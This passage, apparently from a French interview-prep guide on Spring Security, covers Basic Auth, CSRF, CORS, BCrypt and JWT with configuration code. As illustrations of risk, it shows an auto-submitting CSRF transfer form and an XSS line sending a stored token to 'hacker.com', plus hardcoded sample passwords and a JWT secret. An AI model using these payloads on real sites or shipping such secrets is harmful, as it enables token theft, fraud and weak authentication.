curl -H "Authorization: Basic am9objpwYXNzd29yZDEyMw==" \
     http://localhost:8080/api/users

# Ou avec curl -u
curl -u john:password123 http://localhost:8080/api/users
```

**⚠️ Attention :**
- Base64 est **facilement décodable** (pas de chiffrement)
- **HTTPS obligatoire** en production
- Credentials envoyés à **chaque requête** (pas de session)

---

**Q10 : Comment configurer Basic Authentication dans Spring Security ?**

**R :** 

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .httpBasic(Customizer.withDefaults()) // Active Basic Auth
            .csrf(csrf -> csrf.disable()) // Désactiver CSRF pour REST API
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // Pas de session
            );
        
        return http.build();
    }
    
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
            .username("john")
            .password(passwordEncoder().encode("password123"))
            .roles("USER")
            .build();
        
        return new InMemoryUserDetailsManager(user);
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

---

**Q11 : Pourquoi désactiver CSRF pour Basic Authentication ?**

**R :** 

**CSRF (Cross-Site Request Forgery)** protège contre les attaques où un site malveillant exécute des actions au nom d'un utilisateur authentifié.

**CSRF nécessite :**
- Authentification basée sur **cookies/session**
- Le browser envoie automatiquement le cookie à chaque requête

**Basic Authentication :**
- **Stateless** : pas de session, pas de cookie
- Credentials dans le **header Authorization** (non envoyé automatiquement par le browser)
- Impossible pour un site malveillant de forger une requête avec le header Authorization

**Donc :** CSRF protection n'est **pas nécessaire** et peut être désactivée pour les REST APIs stateless.

**Exception :** Si vous utilisez Basic Auth avec sessions (non recommandé), gardez CSRF activé.

---

### **Questions sur CSRF**

**Q12 : Qu'est-ce que CSRF et comment fonctionne l'attaque ?**

**R :** 

**CSRF (Cross-Site Request Forgery)** est une attaque où un site malveillant trompe un utilisateur authentifié pour exécuter des actions non désirées sur un site de confiance.

**Scénario d'attaque :**

1. **Victim** se connecte à `bank.com` → Session active (cookie JSESSIONID)
2. **Victim** visite `malicious.com` (dans un autre onglet)
3. `malicious.com` contient un formulaire caché :
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```
4. Le browser envoie automatiquement le cookie JSESSIONID avec la requête
5. `bank.com` pense que c'est une requête légitime de l'utilisateur
6. **Résultat :** Transfert de 10000€ vers le compte du hacker

**Protection CSRF dans Spring Security :**
Spring génère un **CSRF token** unique par session qui doit être inclus dans toutes les requêtes mutantes (POST, PUT, DELETE).

---

**Q13 : Comment implémenter CSRF protection dans une application web ?**

**R :** 

**Configuration (activée par défaut) :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(Customizer.withDefaults()) // Activé par défaut
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .formLogin(Customizer.withDefaults());
    
    return http.build();
}
```

**Dans les formulaires HTML (Thymeleaf) :**
```html
<form method="POST" th:action="@{/api/users}">
    <!-- Thymeleaf ajoute automatiquement le token -->
    <input type="text" name="name">
    <button type="submit">Create User</button>
</form>

<!-- Ou manuellement -->
<form method="POST" action="/api/users">
    <input type="text" name="name">
    <input type="hidden" 
           th:name="${_csrf.parameterName}" 
           th:value="${_csrf.token}"/>
    <button type="submit">Create User</button>
</form>
```

**Avec AJAX/JavaScript :**
```html
<meta name="_csrf" th:content="${_csrf.token}"/>
<meta name="_csrf_header" th:content="${_csrf.headerName}"/>

<script>
const token = document.querySelector('meta[name="_csrf"]').content;
const header = document.querySelector('meta[name="_csrf_header"]').content;

fetch('/api/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        [header]: token // X-CSRF-TOKEN: abc123
    },
    body: JSON.stringify({ name: 'John' })
});
</script>
```

---

**Q14 : Quand faut-il désactiver CSRF protection ?**

**R :** 

**Désactiver CSRF pour :**
- ✅ **REST APIs stateless** (JWT, Basic Auth sans session)
- ✅ **APIs consommées par des applications non-browser** (mobile apps, scripts)
- ✅ **Microservices internes** (communication server-to-server)

**Garder CSRF activé pour :**
- ❌ **Applications web avec sessions** (Form login)
- ❌ **APIs avec authentification par cookie**
- ❌ **Applications accessibles depuis un browser**

**Configuration pour REST API :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // Désactiver pour REST API
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .httpBasic(Customizer.withDefaults());
    
    return http.build();
}
```

**Règle simple :** Si votre API est **stateless** (pas de session cookies), désactivez CSRF.

---

### **Questions sur CORS**

**Q15 : Qu'est-ce que CORS et pourquoi en avons-nous besoin ?**

**R :** 

**CORS (Cross-Origin Resource Sharing)** est un mécanisme de sécurité des browsers qui **bloque les requêtes AJAX** vers un domaine différent de celui qui a servi la page.

**Same-Origin Policy (problème) :**
```
Frontend:  http://localhost:3000 (React)
Backend:   http://localhost:8080 (Spring Boot)
→ Différents origins → ❌ Requête bloquée par le browser
```

**Même si :**
- Même machine
- Ports différents = Origins différents

**CORS (solution) :**
Le serveur (Spring Boot) envoie des headers autorisant certains origins à accéder aux ressources.

---

**Q16 : Comment configurer CORS dans Spring Security ?**

**R :** 

**Option 1 : Configuration globale (recommandée) :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // Origins autorisés
        configuration.setAllowedOrigins(Arrays.asList(
            "http://localhost:3000",
            "https://myapp.com"
        ));
        
        // Ou autoriser tout (⚠️ uniquement en dev)
        // configuration.setAllowedOrigins(Arrays.asList("*"));
        
        // Méthodes HTTP autorisées
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // Headers autorisés
        configuration.setAllowedHeaders(Arrays.asList("*"));
        
        // Permettre l'envoi de credentials (cookies, Authorization header)
        configuration.setAllowCredentials(true);
        
        // Durée du cache de la preflight request
        configuration.setMaxAge(3600L);
        
        // Headers exposés au client
        configuration.setExposedHeaders(Arrays.asList("Authorization"));
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**Option 2 : Annotation @CrossOrigin (pour endpoints spécifiques) :**
```java
@RestController
@RequestMapping("/api/users")
@CrossOrigin(origins = "http://localhost:3000")
public class UserController {
    
    @GetMapping
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    @PostMapping
    @CrossOrigin(origins = {"http://localhost:3000", "https://myapp.com"})
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
}
```

**Option 3 : WebMvcConfigurer (alternative) :**
```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("http://localhost:3000")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

---

**Q17 : Qu'est-ce qu'une Preflight Request en CORS ?**

**R :** 

Pour certaines requêtes (POST/PUT/DELETE avec headers custom), le browser envoie d'abord une **preflight request** (OPTIONS) pour vérifier si le serveur autorise la vraie requête.

**Flow :**
```
1. Browser → OPTIONS /api/users (preflight)
   Headers:
   - Origin: http://localhost:3000
   - Access-Control-Request-Method: POST
   - Access-Control-Request-Headers: Content-Type, Authorization

2. Server → Response 200 OK
   Headers:
   - Access-Control-Allow-Origin: http://localhost:3000
   - Access-Control-Allow-Methods: POST
   - Access-Control-Allow-Headers: Content-Type, Authorization
   - Access-Control-Max-Age: 3600

3. Browser → POST /api/users (vraie requête)
```

**MaxAge = 3600** : Le browser cache la preflight response pendant 1h (évite de refaire OPTIONS à chaque requête).

---

### **Questions sur User Storage**

**Q18 : Quelles sont les différentes façons de stocker les utilisateurs dans Spring Security ?**

**R :** 

**1. In-Memory (dev/test uniquement) :**
```java
@Bean
public UserDetailsService userDetailsService() {
    UserDetails user = User.builder()
        .username("john")
        .password(passwordEncoder().encode("password123"))
        .roles("USER")
        .build();
    
    UserDetails admin = User.builder()
        .username("admin")
        .password(passwordEncoder().encode("admin123"))
        .roles("ADMIN", "USER")
        .build();
    
    return new InMemoryUserDetailsManager(user, admin);
}
```

**2. JDBC (base de données avec tables Spring Security) :**
```java
@Bean
public UserDetailsService userDetailsService(DataSource dataSource) {
    return new JdbcUserDetailsManager(dataSource);
}
```

Tables SQL standard :
```sql
CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(100) NOT NULL,
    enabled BOOLEAN NOT NULL
);

CREATE TABLE authorities (
    username VARCHAR(50) NOT NULL,
    authority VARCHAR(50) NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username)
);
```

**3. Custom UserDetailsService (recommandé en production) :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) 
            throws UsernameNotFoundException {
        
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPassword())
            .roles(user.getRoles().toArray(new String[0]))
            .accountExpired(!user.isAccountNonExpired())
            .accountLocked(!user.isAccountNonLocked())
            .credentialsExpired(!user.isCredentialsNonExpired())
            .disabled(!user.isEnabled())
            .build();
    }
}
```

**Ma recommandation :** Custom UserDetailsService pour flexibilité totale.

---

**Q19 : Comment implémenter un Custom UserDetailsService complet ?**

**R :** 

**Entity User :**
```java
@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true, nullable = false)
    private String username;
    
    @Column(nullable = false)
    private String password;
    
    private String email;
    
    @ElementCollection(fetch = FetchType.EAGER)
    @CollectionTable(name = "user_roles", joinColumns = @JoinColumn(name = "user_id"))
    @Column(name = "role")
    private Set<String> roles = new HashSet<>();
    
    private boolean enabled = true;
    private boolean accountNonExpired = true;
    private boolean accountNonLocked = true;
    private boolean credentialsNonExpired = true;
}
```

**Repository :**
```java
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);
}
```

**UserDetailsService :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) 
            throws UsernameNotFoundException {
        
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        List<GrantedAuthority> authorities = user.getRoles().stream()
            .map(role -> new SimpleGrantedAuthority("ROLE_" + role))
            .collect(Collectors.toList());
        
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getPassword(),
            user.isEnabled(),
            user.isAccountNonExpired(),
            user.isCredentialsNonExpired(),
            user.isAccountNonLocked(),
            authorities
        );
    }
}
```

**Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private CustomUserDetailsService userDetailsService;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .userDetailsService(userDetailsService) // Utiliser notre service custom
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());
        
        return http.build();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

---

### **Questions sur Password Encoding**

**Q20 : Quelle est la différence entre Encoding, Hashing et Encryption ?**

**R :** 

| Concept | Réversible ? | Clé nécessaire ? | Usage | Exemple |
|---------|-------------|------------------|-------|---------|
| **Encoding** | ✅ Oui | ❌ Non | Représentation données | Base64, URL encoding |
| **Hashing** | ❌ Non (one-way) | ❌ Non | Passwords, intégrité | BCrypt, SHA-256 |
| **Encryption** | ✅ Oui | ✅ Oui | Confidentialité | AES, RSA |

**Encoding (Base64) :**
```java
String original = "password123";
String encoded = Base64.getEncoder().encodeToString(original.getBytes());
// cGFzc3dvcmQxMjM=

String decoded = new String(Base64.getDecoder().decode(encoded));
// password123

// ⚠️ Facilement réversible → NE JAMAIS utiliser pour passwords !
```

**Hashing (BCrypt) - POUR PASSWORDS :**
```java
PasswordEncoder encoder = new BCryptPasswordEncoder();

String rawPassword = "password123";
String hashedPassword = encoder.encode(rawPassword);
// $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// Impossible de retrouver "password123" depuis le hash

// Vérification
boolean matches = encoder.matches("password123", hashedPassword);
// true
```

**Encryption (AES) - POUR DONNÉES SENSIBLES NON-PASSWORDS :**
```java
// Pour données devant être déchiffrées plus tard
// (numéros de carte bancaire, SSN, etc.)
// ⚠️ Ne JAMAIS utiliser pour passwords !
```

---

**Q21 : Pourquoi utiliser BCrypt plutôt que SHA-256 pour les passwords ?**

**R :** 

**SHA-256 (mauvais pour passwords) :**
```java
String password = "password123";
String hash = DigestUtils.sha256Hex(password);
// ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

// ❌ Problèmes :
// 1. Même password → Toujours même hash (pas de salt)
// 2. Très rapide → Vulnérable aux brute-force
// 3. Rainbow tables disponibles
```

**BCrypt (bon pour passwords) :**
```java
PasswordEncoder encoder = new BCryptPasswordEncoder();

String password = "password123";
String hash1 = encoder.encode(password);
// $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

String hash2 = encoder.encode(password);
// $2a$10$DifferentHashEvenForSamePassword...

// ✅ Avantages :
// 1. Salt aléatoire automatique → Chaque hash est unique
// 2. Configurable strength → Ralentit brute-force
// 3. One-way → Impossible de décoder
// 4. Résistant aux rainbow tables
```

**Structure BCrypt hash :**
```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
 │   │  │                                │
 │   │  └─ Salt (22 chars)              └─ Hash (31 chars)
 │   └─ Cost factor (2^10 = 1024 rounds)
 └─ Algorithm version
```

---

**Q22 : Comment configurer le strength de BCrypt ?**

**R :** 

```java
@Bean
public PasswordEncoder passwordEncoder() {
    // Strength = nombre de rounds = 2^strength
    return new BCryptPasswordEncoder(12); // 2^12 = 4096 rounds
}
```

**Valeurs recommandées :**
- **10** (défaut) : ~100ms pour hasher → Bon équilibre
- **12** : ~400ms → Plus sécurisé, acceptable
- **14** : ~1.6s → Très sécurisé mais lent
- **4** : ~1ms → ⚠️ Trop rapide, vulnérable

**Règle :** Choisir une valeur qui prend **100-500ms** sur votre serveur. Cela ralentit suffisamment les brute-force sans impacter l'UX.

**Test performance :**
```java
public class BCryptBenchmark {
    public static void main(String[] args) {
        for (int strength = 10; strength <= 14; strength++) {
            PasswordEncoder encoder = new BCryptPasswordEncoder(strength);
            
            long start = System.currentTimeMillis();
            encoder.encode("password123");
            long duration = System.currentTimeMillis() - start;
            
            System.out.println("Strength " + strength + ": " + duration + "ms");
        }
    }
}

// Output exemple :
// Strength 10: 89ms
// Strength 11: 176ms
// Strength 12: 352ms
// Strength 13: 704ms
// Strength 14: 1408ms
```

**Trade-off :** Plus le strength est élevé, plus c'est sécurisé, mais plus le login est lent.

---

### **Questions sur JWT (JSON Web Token)**

**Q23 : Qu'est-ce que JWT et pourquoi l'utiliser ?**

**R :** 

**JWT (JSON Web Token)** est un standard (RFC 7519) pour créer des **tokens d'accès compacts et autosuffisants** pour les APIs REST stateless.

**Avantages :**
- ✅ **Stateless** : Serveur ne stocke rien, toutes les infos sont dans le token
- ✅ **Scalable** : Pas de session partagée entre serveurs
- ✅ **Cross-domain** : Fonctionne entre différents domaines
- ✅ **Mobile-friendly** : Pas de cookies, juste un header
- ✅ **Microservices-ready** : Chaque service peut valider indépendamment

**Cas d'usage :**
- REST APIs stateless
- Single Page Applications (React, Angular, Vue)
- Mobile applications
- Microservices architecture

---

**Q24 : Quelle est la structure d'un JWT ?**

**R :** 

JWT se compose de **3 parties** séparées par des points :

```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huIiwicm9sZXMiOlsiVVNFUiJdLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**1. Header (Algorithm & Token Type) :**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Encodé en Base64URL : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

**2. Payload (Claims - Données utilisateur) :**
```json
{
  "sub": "john",              // Subject (username)
  "roles": ["USER", "ADMIN"],
  "iat": 1516239022,          // Issued At (timestamp)
  "exp": 1516242622           // Expiration (timestamp)
}
```
Encodé en Base64URL : `eyJzdWIiOiJqb2huIiwi...`

**3. Signature (Garantit l'intégrité) :**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**Important :** 
- ⚠️ Header et Payload sont **encodés** (Base64), pas chiffrés → Lisibles par n'importe qui
- ✅ La **signature** garantit que le token n'a pas été modifié
- ❌ Ne JAMAIS mettre de données sensibles (password, SSN) dans le payload

---

**Q25 : Quelle est la différence entre JWT et Session-based authentication ?**

**R :** 

| Aspect | Session-based | JWT |
|--------|---------------|-----|
| **Storage** | Serveur (mémoire/Redis) | Client (localStorage/header) |
| **State** | Stateful | Stateless |
| **Scalability** | Difficile (session partagée) | Facile (pas de session) |
| **Invalidation** | Facile (supprimer session) | Difficile (attendre expiration) |
| **Security** | Cookie HttpOnly | Dépend du stockage client |
| **Performance** | DB lookup à chaque requête | Validation locale (signature) |
| **Mobile/SPA** | Difficile (cookies) | Facile (header) |

**Flow Session-based :**
```
1. Login → Server crée session → Retourne JSESSIONID cookie
2. Client envoie cookie automatiquement
3. Server lookup session en DB/Redis
4. Logout → Server supprime session
```

**Flow JWT :**
```
1. Login → Server génère JWT → Retourne token
2. Client stocke token (localStorage)
3. Client envoie token dans header Authorization: Bearer <token>
4. Server valide signature du token (pas de DB lookup)
5. Logout côté client uniquement (supprimer token)
```

---

**Q26 : Comment implémenter JWT authentication dans Spring Boot ?**

**R :** 

**Structure complète :**
```
JwtUtil → Génère/valide tokens
JwtAuthenticationFilter → Intercepte requêtes et valide JWT
SecurityConfig → Configure Spring Security
AuthController → Endpoint login
```

**JwtUtil (génération et validation) :**
```java
@Component
public class JwtUtil {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private Long expiration; // 86400000 = 24h en milliseconds
    
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    public String generateToken(String username, List<String> roles) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", roles);
        
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }
    
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    public List<String> extractRoles(String token) {
        Claims claims = extractAllClaims(token);
        return (List<String>) claims.get("roles");
    }
    
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    private Claims extractAllClaims(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    
    private Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
}
```

**application.properties :**
```properties
# JWT Secret (256+ bits pour HS256)
jwt.secret=myVerySecureSecretKeyForJwtTokenGenerationWithAtLeast256BitsForHS256Algorithm
jwt.expiration=86400000
```

---

**Q27 : Comment fonctionne le JwtAuthenticationFilter ?**

**R :** 

Le **JwtAuthenticationFilter** intercepte chaque requête HTTP pour extraire et valider le JWT.

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) 
            throws ServletException, IOException {
        
        // 1. Extraire le header Authorization
        final String authHeader = request.getHeader("Authorization");
        
        // 2. Vérifier format "Bearer <token>"
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }
        
        try {
            // 3. Extraire le token (enlever "Bearer ")
            final String jwt = authHeader.substring(7);
            
            // 4. Extraire username du token
            final String username = jwtUtil.extractUsername(jwt);
            
            // 5. Si username valide et pas déjà authentifié
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                
                // 6. Charger UserDetails depuis la DB
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                // 7. Valider le token (signature + expiration)
                if (jwtUtil.validateToken(jwt, userDetails)) {
                    
                    // 8. Créer Authentication object
                    UsernamePasswordAuthenticationToken authToken = 
                        new UsernamePasswordAuthenticationToken(
                            userDetails,
                            null,
                            userDetails.getAuthorities()
                        );
                    
                    authToken.setDetails(
                        new WebAuthenticationDetailsSource().buildDetails(request)
                    );
                    
                    // 9. Stocker dans SecurityContext
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            }
        } catch (ExpiredJwtException e) {
            logger.error("JWT token expired: {}", e.getMessage());
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\":\"Token expired\"}");
            return;
        } catch (Exception e) {
            logger.error("Cannot set user authentication: {}", e.getMessage());
        }
        
        // 10. Continuer la chaîne de filtres
        filterChain.doFilter(request, response);
    }
}
```

**Flow détaillé :**
```
1. Client → GET /api/users
   Header: Authorization: Bearer eyJhbGc...
   
2. JwtAuthenticationFilter → Intercepte
   
3. Extract JWT from header
   
4. Parse JWT → Extract username="john"
   
5. Load UserDetails from DB (via UserDetailsService)
   
6. Validate JWT:
   - Signature correcte ?
   - Expiration valide ?
   - Username match ?
   
7. Si valide → Create Authentication object
   
8. Store in SecurityContext
   
9. Continue to Controller
```

---

**Q28 : Comment intégrer le JwtAuthenticationFilter dans Spring Security ?**

**R :** 

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // Pas de session
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**", "/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            // Ajouter JWT filter AVANT UsernamePasswordAuthenticationFilter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

**Pourquoi `.addFilterBefore()` ?**
- JWT filter doit s'exécuter **avant** le filtre d'authentication standard
- Si JWT valide → User authentifié avant d'atteindre les autres filtres
- Si JWT invalide → Requête bloquée

---

**Q29 : Comment implémenter le endpoint /auth/login avec JWT ?**

**R :** 

```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {
        try {
            // 1. Authentifier avec AuthenticationManager
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );
            
            // 2. Charger UserDetails
            UserDetails userDetails = userDetailsService.loadUserByUsername(request.getUsername());
            
            // 3. Extraire roles
            List<String> roles = userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .map(role -> role.replace("ROLE_", ""))
                .collect(Collectors.toList());
            
            // 4. Générer JWT
            String jwt = jwtUtil.generateToken(userDetails.getUsername(), roles);
            
            // 5. Retourner token
            return ResponseEntity.ok(new AuthResponse(
                jwt,
                userDetails.getUsername(),
                roles
            ));
            
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(new ErrorResponse("Invalid username or password"));
        }
    }
    
    @PostMapping("/register")
    public ResponseEntity<?> register(@Valid @RequestBody RegisterRequest request) {
        // Vérifier si username existe déjà
        if (userRepository.existsByUsername(request.getUsername())) {
            return ResponseEntity.badRequest()
                .body(new ErrorResponse("Username already taken"));
        }
        
        // Créer nouveau user
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setRoles(Set.of("USER"));
        
        userRepository.save(user);
        
        return ResponseEntity.ok(new MessageResponse("User registered successfully"));
    }
}

// DTOs
@Data
class LoginRequest {
    @NotBlank
    private String username;
    
    @NotBlank
    private String password;
}

@Data
@AllArgsConstructor
class AuthResponse {
    private String token;
    private String username;
    private List<String> roles;
}

@Data
class RegisterRequest {
    @NotBlank
    @Size(min = 3, max = 20)
    private String username;
    
    @NotBlank
    @Email
    private String email;
    
    @NotBlank
    @Size(min = 6, max = 40)
    private String password;
}

@Data
@AllArgsConstructor
class ErrorResponse {
    private String message;
}

@Data
@AllArgsConstructor
class MessageResponse {
    private String message;
}
```

---

**Q30 : Comment utiliser JWT côté client (React/JavaScript) ?**

**R :** 

**Login et stockage du token :**
```javascript
// Login
async function login(username, password) {
    const response = await fetch('http://localhost:8080/auth/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
        const data = await response.json();
        
        // Stocker le token
        localStorage.setItem('token', data.token);
        localStorage.setItem('username', data.username);
        localStorage.setItem('roles', JSON.stringify(data.roles));
        
        console.log('Login successful');
    } else {
        console.error('Login failed');
    }
}

// Requête protégée
async function getUsers() {
    const token = localStorage.getItem('token');
    
    const response = await fetch('http://localhost:8080/api/users', {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        }
    });
    
    if (response.ok) {
        const users = await response.json();
        console.log(users);
    } else if (response.status === 401) {
        console.error('Token expired or invalid');
        // Redirect to login
        window.location.href = '/login';
    }
}

// Logout
function logout() {
    localStorage.removeItem('token');
    localStorage.removeItem('username');
    localStorage.removeItem('roles');
    window.location.href = '/login';
}

// Interceptor Axios (alternative)
import axios from 'axios';

const api = axios.create({
    baseURL: 'http://localhost:8080'
});

// Ajouter token automatiquement
api.interceptors.request.use(
    config => {
        const token = localStorage.getItem('token');
        if (token) {
            config.headers['Authorization'] = `Bearer ${token}`;
        }
        return config;
    },
    error => Promise.reject(error)
);

// Gérer expiration token
api.interceptors.response.use(
    response => response,
    error => {
        if (error.response && error.response.status === 401) {
            localStorage.clear();
            window.location.href = '/login';
        }
        return Promise.reject(error);
    }
);

// Utilisation
api.get('/api/users').then(response => console.log(response.data));
```

---

**Q31 : Quels sont les risques de sécurité avec JWT et comment les mitiger ?**

**R :** 

**Risques et solutions :**

**1. XSS (Cross-Site Scripting) :**
- **Risque :** Si token dans localStorage, un script malveillant peut le voler
```javascript
// Script XSS malveillant
<script>
    fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```
- **Solution :**
  - Sanitize toutes les inputs utilisateur
  - Use Content Security Policy (CSP)
  - Stocker token dans HttpOnly cookie (si possible)

**2. Token Theft :**
- **Risque :** Token intercepté → Attaquant peut l'utiliser jusqu'à expiration
- **Solution :**
  - Short expiration (15min - 1h)
  - Refresh tokens pour prolonger session
  - HTTPS obligatoire
  - Token rotation

**3. JWT Size :**
- **Risque :** JWT peut devenir gros avec beaucoup de claims
- **Solution :**
  - Stocker seulement données essentielles (user ID, roles)
  - Ne pas stocker objets complets

**4. Secret Key Weak :**
- **Risque :** Clé faible → Attaquant peut forger tokens
- **Solution :**
  - Clé 256+ bits pour HS256
  - Stocker dans variables d'environnement, pas dans code
```properties
# ✅ Bon
jwt.secret=${JWT_SECRET}

# ❌ Mauvais
jwt.secret=mysecret
```

**5. No Revocation :**
- **Risque :** Impossible d'invalider un token avant expiration
- **Solution :**
  - Token blacklist (Redis)
  - Short expiration + Refresh tokens
